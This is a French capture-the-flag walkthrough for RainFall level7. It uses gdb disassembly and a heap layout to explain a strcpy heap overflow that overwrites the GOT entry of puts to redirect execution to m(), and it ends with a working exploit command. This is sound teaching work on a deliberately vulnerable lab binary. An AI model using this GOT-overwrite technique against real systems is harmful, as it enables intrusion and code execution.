Pour level7, on a un programme qui segfault peut importe ce qu'on lui donne en argument
si on met 2 arguments :
level7@RainFall:~$ ./level7 test test1
~~


gdb et info functions, montrent 2 fonctions intéressante, main et m.

main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   %ebp
   0x08048522 <+1>:     mov    %esp,%ebp
   0x08048524 <+3>:     and    $0xfffffff0,%esp
   0x08048527 <+6>:     sub    $0x20,%esp
   0x0804852a <+9>:     movl   $0x8,(%esp)
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
   0x0804853a <+25>:    mov    0x1c(%esp),%eax
   0x0804853e <+29>:    movl   $0x1,(%eax)
   0x08048544 <+35>:    movl   $0x8,(%esp)
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    %eax,%edx
   0x08048552 <+49>:    mov    0x1c(%esp),%eax
   0x08048556 <+53>:    mov    %edx,0x4(%eax)
   0x08048559 <+56>:    movl   $0x8,(%esp)
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    %eax,0x18(%esp)
   0x08048569 <+72>:    mov    0x18(%esp),%eax
   0x0804856d <+76>:    movl   $0x2,(%eax)
   0x08048573 <+82>:    movl   $0x8,(%esp)
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    %eax,%edx
   0x08048581 <+96>:    mov    0x18(%esp),%eax
   0x08048585 <+100>:   mov    %edx,0x4(%eax)
   0x08048588 <+103>:   mov    0xc(%ebp),%eax
   0x0804858b <+106>:   add    $0x4,%eax
   0x0804858e <+109>:   mov    (%eax),%eax
   0x08048590 <+111>:   mov    %eax,%edx
   0x08048592 <+113>:   mov    0x1c(%esp),%eax
   0x08048596 <+117>:   mov    0x4(%eax),%eax
   0x08048599 <+120>:   mov    %edx,0x4(%esp)
   0x0804859d <+124>:   mov    %eax,(%esp)
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    0xc(%ebp),%eax
   0x080485a8 <+135>:   add    $0x8,%eax
   0x080485ab <+138>:   mov    (%eax),%eax
   0x080485ad <+140>:   mov    %eax,%edx
   0x080485af <+142>:   mov    0x18(%esp),%eax
   0x080485b3 <+146>:   mov    0x4(%eax),%eax
   0x080485b6 <+149>:   mov    %edx,0x4(%esp)
   0x080485ba <+153>:   mov    %eax,(%esp)
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    $0x80486e9,%edx
   0x080485c7 <+166>:   mov    $0x80486eb,%eax
   0x080485cc <+171>:   mov    %edx,0x4(%esp)
   0x080485d0 <+175>:   mov    %eax,(%esp)
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
   0x080485dc <+187>:   movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:   movl   $0x8049960,(%esp)
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    $0x0,%eax
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret
End of assembler dump.

m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.

m n'est pas appellé et dispose d'un printf.

On voit également que strcpy  est utilisé 2 fois.

On voit également qu'on a fgets qui va chercher et qui le sauvegarde. 

Il y a également la fonction puts qui est une fonction visible dans GOT.

Donc on va essayer de détourner la fonction puts pour executer m en utilisant les strcpy pour écrire ce qu'on veut en mémoire. 

D'abord nous alons regarder comment est disposé la mémoire.

On pose un breakpoint après le 4 mallocs

`b *0x080485a0`

Ensuite on regarde les valeurs a et b et leurs adress

(gdb) print/x $eax
$3 = 0x804a018
(gdb) x/xw $esp+0x18
0xbffff728:     0x0804a028

*a->next = 0x0804a018 (buffer où av[1] sera copié via le 1er strcpy)
*b = 0x0804a028 (adresse de la structure b, retournée par le 3ᵉ malloc)
(gdb)  x/xw 0x0804a028+4
0x804a02c:      0x0804a038
b->next est stocké à l'adresse 0x0804a02c

Disposition du tas (heap) : chaque chunk fait 16 octets
Chunk #1
0x804a000  prev_size = 0
0x804a004  size      = 0x11
0x804a008  a->value
0x804a00c  a->next

Chunk #2
0x804a010  prev_size = 0
0x804a014  size      = 0x11
0x804a018  av[1] buffer

Chunk #3
0x804a020  prev_size = 0
0x804a024  size      = 0x11
0x804a028  b->value
0x804a02c  b->next

Chunk #4
0x804a030  prev_size = 0
0x804a034  size      = 0x11
0x804a038  av[2] buffer

Il faut envoyer, comme av[1], 20 octets de bourrage (n'importe quoi, par exemple des "A") pour combler l'espace entre le début de a->next et l'emplacement de b->next suivi de 4 octets contenant l'adresse qu'on veut mettre à la place de b->next (ce sera l'adresse GOT de puts, qu'on n'a pas encore récupérée)

On récupére l'adresse de m 0x80484f4 (print &m dans gdb)

On récupère l'adresse de puts
(gdb) info functions puts
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
0xb7e911a0  _IO_fputs
0xb7e911a0  fputs
0xb7e927e0  _IO_puts
0xb7e927e0  puts
0xb7e96ee0  fputs_unlocked
0xb7f20750  putspent
0xb7f21fa0  putsgent
(gdb) disassemble 0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928 <-- ici
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.

nous allons faire une commande qui fait déborder le premier buffer alloué (avec 20 octets de remplissage) pour écraser le pointeur du second buffer par l'adresse de la table GOT de puts, puis écrit dans cette table l'adresse de la fonction m(), si bien que le programme, croyant appeler puts("~~") à la fin, exécute en réalité m() — qui affiche le mot de passe de level8 fraîchement lu en mémoire.

 ./level7 $(python2 -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python2 -c 'print("\xf4\x84\x04\x08")')